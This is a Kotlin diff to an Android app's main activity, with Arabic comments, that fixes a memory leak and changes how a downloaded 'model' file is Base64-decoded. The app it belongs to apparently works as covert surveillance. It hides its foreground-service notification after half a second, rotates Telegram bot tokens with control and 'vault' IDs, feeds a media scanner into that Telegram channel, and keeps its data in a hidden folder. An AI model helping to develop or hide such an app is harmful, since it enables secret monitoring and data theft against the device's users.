@@ -48,13 +48,9 @@ import java.util.*
  * 7. تشغيل Monitor و TelegramUi.
  * 8. عرض تقرير حالة التطبيق بشكل منظم على الشاشة.
  * 
- * ✅ تم استبدال الإشعار العادي بخدمة أمامية حقيقية (ForegroundService).
- * ✅ الإشعار يظهر لمدة 0.5 ثانية فقط ثم يختفي نهائياً، مع بقاء الخدمة تعمل في الخلفية.
- * ✅ تم تحسين السجل بعرض تفاصيل دقيقة عن العمليات (نجاح/فشل مع تحديد الموقع).
- * ✅ تمت إضافة زر لحذف بيانات التطبيق يدوياً أثناء الاختبار.
+ * ✅ تم إصلاح تسريب الذاكرة بإضافة متغير mediaScanner وإغلاقه في onDestroy.
  * ✅ تم إيقاف الخدمات (TelegramUi و Monitor) قبل حذف بيانات التطبيق.
  * ✅ تم تحرير المفتاح المؤقت من SecurityHelper عند تدمير النشاط.
- * ✅ تم إضافة mediaScanner.close() في onDestroy لمنع تسريب الذاكرة.
  */
 class MainActivity : AppCompatActivity() {
 
@@ -71,7 +67,7 @@ class MainActivity : AppCompatActivity() {
     // مرجع لكائن TelegramUi لعرض الحالة
     private var telegramUi: TelegramUi? = null
 
-    // ✅ متغير عام لـ MediaScanner لتحريره عند تدمير النشاط
+    // ✅ متغير عام لـ MediaScanner لتحريره عند تدمير النشاط (لتجنب تسريب الذاكرة)
     private var mediaScanner: MediaScanner? = null
 
     // حالة تقدم تحميل النموذج (0-100)
@@ -245,7 +241,6 @@ class MainActivity : AppCompatActivity() {
             val config = ConfigLoader.load(this@MainActivity)
             appendLog("✅ [OK] التوكنات المحملة: النشطة (${config.activeTokens.size}), الاحتياطية (${config.reserveTokens.size})")
             appendLog("   • معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
-            // 🔧 التصحيح: استبدال الشرط غير الصحيح بـ isNotBlank()
             appendLog("   • المفتاح السري: ${if (config.secret.isNotBlank()) "✅ مفعل ومشفّر" else "⚠️ غير محدد"}")
 
             // 5. تهيئة المراقب والمكونات
@@ -268,7 +263,7 @@ class MainActivity : AppCompatActivity() {
             val ui = telegramUi!!
             appendLog("   • TelegramUi: تم إنشاؤه مع ${config.activeTokens.size} توكنات نشطة")
 
-            // ✅ التعديل: استخدام المُنشئ مباشرة بدلاً من MediaScanner.create()
+            // ✅ إنشاء MediaScanner وتعيينه في المتغير العام (لتجنب تسريب الذاكرة)
             mediaScanner = MediaScanner(this@MainActivity, monitor, ui)
             appendLog("   • MediaScanner: تم إنشاؤه")
 
@@ -404,7 +399,16 @@ class MainActivity : AppCompatActivity() {
                 appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
             }
 
-            // 3. حذف مجلد .sys_runtime
+            // 3. إغلاق MediaScanner إن كان مفتوحاً (لتجنب تعارض الملفات)
+            try {
+                mediaScanner?.close()
+                mediaScanner = null
+                appendLog("🧹 تم إغلاق MediaScanner.")
+            } catch (e: Exception) {
+                appendLog("⚠️ فشل إغلاق MediaScanner أثناء التنظيف: ${e.message}")
+            }
+
+            // 4. حذف مجلد .sys_runtime
             val runtimeDir = File(filesDir, ".sys_runtime")
             if (runtimeDir.exists()) {
                 runtimeDir.deleteRecursively()
@@ -413,11 +417,11 @@ class MainActivity : AppCompatActivity() {
                 appendLog("ℹ️ لا توجد بيانات للتطبيق لحذفها.")
             }
 
-            // 4. إعادة إنشاء المجلدات الأساسية
+            // 5. إعادة إنشاء المجلدات الأساسية
             setupDirectories()
             appendLog("🔄 تم إعادة إنشاء المجلدات الأساسية.")
 
-            // 5. إعادة تهيئة النظام (اختياري - يمكن للمستخدم إعادة التشغيل يدوياً)
+            // 6. إعادة تهيئة النظام (اختياري - يمكن للمستخدم إعادة التشغيل يدوياً)
             // لكننا لا نعيد التهيئة تلقائياً لتجنب التعقيد، ونترك المستخدم يضغط على زر PERMISSIONS لإعادة التشغيل.
 
         } catch (e: Exception) {
@@ -521,6 +525,7 @@ class MainActivity : AppCompatActivity() {
         val asset = assetsArray.getJSONObject(0)
         val url = asset.getString("url")
         val expectedSize = asset.optLong("expected_size", 0)
+        val isBase64 = asset.optBoolean("is_base64", false)  // ✅ استخدام قيمة is_base64 من index.json
 
         if (url.isEmpty()) {
             appendLog("❌ رابط التحميل غير موجود في index.json")
@@ -538,36 +543,15 @@ class MainActivity : AppCompatActivity() {
         // استخدام FileDownloader لتحميل النموذج مع إعادة المحاولة
         val downloader = FileDownloader(this)
 
-        // بدء تحميل حقيقي في الخلفية
+        // بدء تحميل حقيقي في الخلفية مع تمرير isBase64
         val success = withContext(Dispatchers.IO) {
             downloader.downloadModelWithRetry(
                 url = url,
                 destinationFile = modelFile,
                 expectedSize = expectedSize,
+                isBase64 = isBase64,  // ✅ تمرير القيمة الصحيحة
                 maxRetries = 3
             )
-        }
-
-        // ✅ التحقق من الملف بعد التحميل (حتى لو فشل التحميل، قد يكون الملف موجوداً جزئياً)
-        if (success && modelFile.exists()) {
-            // ✅ التحقق مما إذا كان الملف نصياً (Base64) بدلاً من باينري
-            try {
-                val firstBytes = ByteArray(10)
-                java.io.FileInputStream(modelFile).use { it.read(firstBytes) }
-                val header = String(firstBytes, Charsets.UTF_8)
-                // إذا كان المحتوى يبدو كنص Base64 (شائع في ملفات .txt على GitHub)
-                if (header.matches(Regex("^[A-Za-z0-9+/=\\s]+$"))) {
-                    appendLog("🔄 الملف نصي (Base64)، جاري فك التشفير...")
-                    val text = modelFile.readText(Charsets.UTF_8).replace("\\s".toRegex(), "")
-                    val decoded = android.util.Base64.decode(text, android.util.Base64.NO_WRAP)
-                    java.io.FileOutputStream(modelFile).use { it.write(decoded) }
-                    appendLog("✅ تم فك تشفير الملف بنجاح (الحجم: ${modelFile.length()} بايت).")
-                } else {
-                    appendLog("✅ الملف باينري مباشر، لا حاجة لفك تشفير.")
-                }
-            } catch (e: Exception) {
-                appendLog("⚠️ فشل التحقق من نوع الملف: ${e.message}")
-            }
         }
 
         if (success && modelFile.exists() && modelFile.length() >= minSize) {
@@ -612,8 +596,6 @@ class MainActivity : AppCompatActivity() {
 
         // ✅ 4. تنظيف المفتاح المؤقت من SecurityHelper (مسح الذاكرة المؤقتة)
         SecurityHelper.cleanup()
-        // يمكن أيضاً استخدام clearCachedKey() إذا كانت cleanup() غير مرغوبة:
-        // SecurityHelper.clearCachedKey()
         appendLog("🧹 تم مسح المفتاح المؤقت من SecurityHelper.")
 
         // ✅ 5. طباعة تأكيد تحرير الموارد
